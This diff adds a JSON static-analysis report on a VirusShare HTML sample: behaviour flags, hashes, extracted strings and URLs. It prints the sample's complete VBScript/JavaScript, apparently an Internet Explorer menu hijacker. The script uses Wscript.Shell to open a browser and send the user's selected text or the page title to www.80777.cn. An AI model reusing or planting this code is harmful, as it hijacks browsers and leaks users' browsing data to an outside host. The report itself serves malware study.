@@ -1,0 +1,86 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Wscript.Shell": "May run an executable file or a system command",
+            "chr": "May attempt to obfuscate specific str",
+            "open": "May open a file",
+            "run": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<script language=\"VBScript\">\nFunction vsgo(txt)\nset shell = CreateObject(\"Wscript.Shell\")\nshell.run chr(34) & \"C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\" & chr(34) &  \" http://www.80777.cn/s3/?\" & txt\nEnd Function\n</script>\n<script LANGUAGE=\"JavaScript\"> \nfunction gotos()\n{\n\tif (external.menuArguments) { \n\tvar parentwin = external.menuArguments; \n\tif (parentwin.document.selection){ \n\tvar sel = parentwin.document.selection.createRange().text; \n\t}\n\tif(sel)\n\t{\n\tif( slen(sel)>38 ) sel = strString(sel,66)\n\tvsgo(sel);\n\treturn false;\n\t//window.open('http://go2000.cn/p/?sky=gb&q='+sel,'');return false;\n\t}\n\telse \n\tvar sel = ''; \n\tvar url = parentwin.location.href; \n\tvar title = parentwin.document.title; \n\tif(parentwin.event.srcElement.tagName == \"A\") { \n\turl = parentwin.event.srcElement.getAttribute(\"HREF\"); \n\ttitle = parentwin.event.srcElement.innerText; \n\t}\n\t//void(window.open('http://www.go2000.cn/p/?sky=gb&q='+title,''));\n\t} else { \n\t//history.go(-1); \n\t}\n\tif( title )\tvsgo(title);\n\t//window.open('http://www.go2000.cn/p/?sky=gb&q='+title,'')\n}\nfunction slen(str){\n\tvar c=0\n\tfor(var i=0;i<str.length;i++) (str.charCodeAt(i)>255) ? c+=2:c++;\n\treturn c\n}\nfunction strString(str,len)\n{\n\tvar strlen = 0,s = \"\";\n\tfor(var i = 0;i < str.length;i++)\n\t{\n\t\tif(str.charCodeAt(i) > 128)\tstrlen += 2;else strlen++;\n\t\ts += str.charAt(i);\n\t\tif(strlen >= len)\n\t\treturn s;\n\t}\n\treturn s;\n}\ngotos();\n</script> "
+    },
+    "filename": "VirusShare_ca26c106df0615f65f011dbbd715175d",
+    "filesize": 1460,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "ca26c106df0615f65f011dbbd715175d",
+        "sha1": "962593456b85ff31b74f1f79598cd33e31b0a161",
+        "sha256": "f3b874083dd9b5a0dc6729f3a39127250f23938ed2801cf415e082f4b15093bd"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=\"VBScript\">",
+            "Function vsgo(txt)",
+            "set shell = CreateObject(\"Wscript.Shell\")",
+            "shell.run chr(34) & \"C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\" & chr(34) &  \" http://www.80777.cn/s3/?\" & txt",
+            "End Function",
+            "</script>",
+            "<script LANGUAGE=\"JavaScript\"> ",
+            "function gotos()",
+            "\tif (external.menuArguments) { ",
+            "\tvar parentwin = external.menuArguments; ",
+            "\tif (parentwin.document.selection){ ",
+            "\tvar sel = parentwin.document.selection.createRange().text; ",
+            "\tif(sel)",
+            "\tif( slen(sel)>38 ) sel = strString(sel,66)",
+            "\tvsgo(sel);",
+            "\treturn false;",
+            "\t//window.open('http://go2000.cn/p/?sky=gb&q='+sel,'');return false;",
+            "\telse ",
+            "\tvar sel = ''; ",
+            "\tvar url = parentwin.location.href; ",
+            "\tvar title = parentwin.document.title; ",
+            "\tif(parentwin.event.srcElement.tagName == \"A\") { ",
+            "\turl = parentwin.event.srcElement.getAttribute(\"HREF\"); ",
+            "\ttitle = parentwin.event.srcElement.innerText; ",
+            "\t//void(window.open('http://www.go2000.cn/p/?sky=gb&q='+title,''));",
+            "\t} else { ",
+            "\t//history.go(-1); ",
+            "\tif( title )\tvsgo(title);",
+            "\t//window.open('http://www.go2000.cn/p/?sky=gb&q='+title,'')",
+            "function slen(str){",
+            "\tvar c=0",
+            "\tfor(var i=0;i<str.length;i++) (str.charCodeAt(i)>255) ? c+=2:c++;",
+            "\treturn c",
+            "function strString(str,len)",
+            "\tvar strlen = 0,s = \"\";",
+            "\tfor(var i = 0;i < str.length;i++)",
+            "\t\tif(str.charCodeAt(i) > 128)\tstrlen += 2;else strlen++;",
+            "\t\ts += str.charAt(i);",
+            "\t\tif(strlen >= len)",
+            "\t\treturn s;",
+            "\treturn s;",
+            "gotos();",
+            "</script> "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://go2000.cn/p/?sky=gb&q=",
+            "http://www.go2000.cn/p/?sky=gb&q=",
+            "http://www.80777.cn/s3/?"
+        ]
+    },
+    "time": "0:00:00.298831",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
